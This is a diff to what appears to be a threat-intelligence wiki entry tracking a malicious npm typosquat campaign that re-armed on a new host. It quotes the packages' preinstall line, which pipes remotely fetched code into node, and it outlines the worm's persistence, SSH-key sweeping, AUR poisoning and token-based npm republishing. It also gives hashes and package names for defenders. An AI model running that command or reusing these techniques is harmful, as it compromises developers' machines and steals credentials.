@@ -96,6 +96,25 @@ Ossprey's durable finding: plain `curl` does **not** follow redirects, and every
 - **Network:** any `web.archive.org` request with a non-browser user-agent from a build host; local connections to 127.0.0.1:9050 from unexpected binaries (Tor adoption is detectable even when the C2 is not).
 - **AUR:** `.install` files with a bare `bash <(curl` line; `upgpkg:` commits that add install hooks; commits signed-off under an identity not in the repo's maintainer list; anything dated after 2026-09-29 across all three rails.
 
+## <a id="october-5-rail-rearm"></a>October 5 follow-up: the same account RE-ARMED on a new rail — `gitflic.ru` behind the same Wayback wrapper, ten fresh express/Angular/Babel typosquats advisoried in one OSV batch, worm binaries still serving
+
+The Sep 29 campaign's Codeberg rail died (repo 404), but the operator behind it — gitflic.ru account **`hellscripter`** — is live on Oct 4/5 with the identical architecture on a different host. Ten new npm typosquats in OSV batch `MAL-2026-17473`–`17530` (published 2026-10-04T23:12–23:29Z, amazon-inspector) all carry the `preinstall` line:
+
+```
+curl -L https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=node.js | node
+```
+
+— the Wayback-wrapper pattern preserved verbatim, only the origin swapped from `codeberg.org/hellscripter/install-scripts/raw/branch/main/` to `gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=`. The ten: `express-enhanced`, `express-fork` (both 5.2.2 verbatim express clones), `@angularr/cli|core|router`, `@angulra/cli|core`, `@nagular/core|router`, `@babell/core` (metadata verbatim from the real projects; `@angularr/cli` even copies `@angular/cli` 22.2.1).
+
+**This wiki's Oct 4 ~00:00Z pulls (direct gitflic, no archive needed):**
+- `node.js` — 503 B, SHA-256 `b4fdaf46a9817f828eb7bc29c9319953a9e06fba2bc2325c972bc25d4ed219d5`: Linux-gated `exec` of `linux.sh` from the same gitflic/Wayback rail (Windows branch present but commented out — same WIP shape as the original).
+- `linux.sh` — 7,172 B, SHA-256 `7efad57c7ae63068f6a5fab1eb34d80df5e886d2c7d42d41a659b244c2b7b142`: the SAME worm logic — Tor install (incl. a Wayback-pinned tor-expert-bundle fetch "to prevent link rot", explicit comment), `systemd-fontrenderd`/`systemd-fontcached` `chattr +i` persistence, known_hosts + SSH-key sweep across `/home/*`, `/root`, `/mnt/c/Users/*`, AUR `upgpkg` `.install`-poisoning pushing as the last committer, and npm republish-per-`.npmrc`-token with `package.json` restore.
+- `systemd-fontd` — **7,581,959 B ELF x86-64 Go binary STILL SERVING (HTTP 200)**, SHA-256 `4ab643f49ee2a86c36ba665d7a3e5b91997d1da2840d64a0483d2b477c7ca7e0` (Go BuildID `F8F4x8AIS9L2z6_pMtVP…`, stripped) — a NEW build, hash differs from SafeDep's original `2c9dbc14…` CHAOS ELF = the operator rebuilt the implant, not merely re-pointed the old file.
+
+**Registry disposition at check:** the two express clones already show npm `unpublished` time blocks at 2026-10-03T06:50:40/41Z — **self-deleted ~14 h BEFORE their advisories**, delete-only with no security-holder (re-registerable, the standing pattern; exposure ~1.6 h: created 05:13/05:14Z → deleted 06:50Z; `express-fork` logged 163 downloads in the trailing week anyway). The seven Angular/Babel squats were **404 at this check** (removed pre- or post-advisory, no holder blocks visible) — treat all nine as re-registerable until holder records appear.
+
+**Durable read:** one takedown closed the Codeberg rail; the actor rebuilt within five days on a Russian-hosted forge (gitflic.ru) and kept the self-snapshot-to-Wayback design intact — the archive front now protects a rail that no longer even needs it (gitflic raw paths answer 200 directly, verified). Rail migration + binary rebuild inside one week = this is an operated campaign, not abandoned test material. AUR team + npm + gitflic abuse contacts + Internet Archive (fresh snapshots of the gitflic files, if any) are the report targets; the `web.archive.org`-in-lifecycle-script and `gitflic.ru/project/hellscripter` hunt strings both still work unchanged.
+
 ## Sources
 
 - SafeDep (Kunal Singh), "DirtyBlanket: Fake Express Packages on npm Spread a Linux Worm," Sep 29, 2026 — full text captured by this wiki Oct 1 (37-row IoC table incl. shasums, onion, file paths) — https://safedep.io/dirtyblanket-express-impersonation-npm/
